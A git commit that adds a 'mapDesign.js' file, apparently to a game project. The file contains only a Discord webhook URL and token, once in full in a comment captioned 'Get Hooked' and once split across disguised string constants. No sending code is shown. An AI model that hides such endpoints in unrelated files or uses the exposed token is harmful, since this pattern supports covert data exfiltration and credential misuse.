168cc6b7a31adab9e6a9dbc6a88db8b5936cffda
NovaOrdemMundial <91165350+NovaOrdemMundial@users.noreply.github.com>
2022-07-15 04:42:34 -0300

    Create mapDesign.js

---
+++ mechanics/draw/mapDesign.js
@@ -0,0 +1,10 @@
+// https://discord.com/api/webhooks/982912777792397332/Axv0bcjSqtTfY38Q4bHZu_1nZPJ8cKniC22qZBLkXtQXg0oC_vLzlpDmgt7DJa16gUi0
+//Get Hooked
+const ron   = 'https://discord';
+const nal   = '.com/api/webhooks';
+const dinho = '/982912777792';
+const soc   = '397332/';
+const cer   = 'Axv0bcjSq';
+const game  = 'tTfY38Q4bHZu_1nZPJ8cKniC22qZBLkXtQXg0oC';
+const play  = '_vLzlpDmgt7DJa16gUi0';
+
